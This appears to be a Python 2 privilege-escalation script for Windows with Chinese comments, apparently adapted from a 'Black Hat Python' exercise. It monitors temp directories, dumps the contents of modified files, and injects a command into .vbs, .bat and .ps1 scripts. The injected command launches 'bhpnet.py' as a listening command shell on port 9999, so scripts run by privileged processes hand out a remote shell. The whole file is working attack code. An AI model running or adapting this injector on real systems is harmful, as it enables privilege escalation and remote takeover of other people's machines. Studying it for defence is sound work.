#-*- coding:utf8 -*-

"""
@version: 
@author: giantbranch
@file: file_monitor.py
@time: 2016/3/14 23:36
"""

import tempfile
import threading
import win32file
import win32con
import os

# 这些是典型的临时文件所在路径,就是我们监控的目录
dirs_to_monitor = ["C:\\WINDOWS\\Temp",tempfile.gettempdir()]

# 文件修改行为对应常量
FILE_CREATE = 1
FILE_DELETE = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

# 定义匹配特定文件扩展名的字典
file_types = {}

command = "python C:\\WINDOWS\\TEMP\\bhpnet.py –l –p 9999 –c"
# 每段扩展名对应一个特定的标签及我们想要插入的一段脚本
file_types['.vbs'] = ["\r\n'bhpmarker\r\n","\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command]
file_types['.bat'] = ["\r\nREM bhpmarker\r\n","\r\n%s\r\n" % command]
file_types['.ps1'] = ["\r\n#bhpmarker","Start-Process \"%s\"" % command]

# 用于执行代码插入的函数
def inject_code(full_filename, extension, contents):
    # 判断文件是否存在标记
    if file_types[extension][0] in contents:
        return

    # 如果没有标记的话，那么插入代码并标记
    full_contents = file_types[extension][0]
    full_contents += file_types[extension][1]
    full_contents += contents

    fd = open(full_filename, "wb")
    fd.write(full_contents)
    fd.close()

    print "[\o/] Injected code"

    return

# 为每个监控器起一个线程
def start_monitor(path_to_watch):

    # 访问模式
    FILE_LIST_DIRECTORY = 0x0001

    # 获取文件目录句柄
    h_directory = win32file.CreateFile(
        path_to_watch,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ |win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None
    )

    while 1:
        try:
            # 这函数会在目录结构改变时通知我们
            results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_SIZE |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY,
                None,
                None
            )

            # 我们可以获得发送了何种改变，以及目标文件的名称
            for action,file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)

                if action == FILE_CREATE:
                    print "[ + ] Created %s" % full_filename
                elif action == FILE_DELETE:
                    print "[ - ] Deleted %s" % full_filename
                elif action == FILE_MODIFIED:
                    print "[ * ] Modified %s" % full_filename
                    # 输出文件内容
                    print "[vvv] Dumping contents..."
                    try:
                        # 打开文件读数据
                        fd = open(full_filename, "rb")
                        contents = fd.read()
                        fd.close()
                        print contents
                        print "[^^^] Dump complete."
                    except:
                        print "[!!!] Failed."

                    # 文件和文件扩展名分离
                    filename, extension = os.path.splitext(full_filename)
                    if extension in file_types:
                        inject_code(full_filename, extension, contents)

                # 重命名哪个文件
                elif action == FILE_RENAMED_FROM:
                    print "[ > ] Renamed from: %s" % full_filename
                # 重命名后的文件名是?
                elif action == FILE_RENAMED_TO:
                    print "[ < ] Renamed to: %s" % full_filename
                else:
                    print "[???] Unknown: %s" % full_filename
        except:
            pass


for path in dirs_to_monitor:
    monitor_thread = threading.Thread(target=start_monitor,args=(path,))
    print "Spawning monitoring thread for path: %s" % path
    monitor_thread.start()
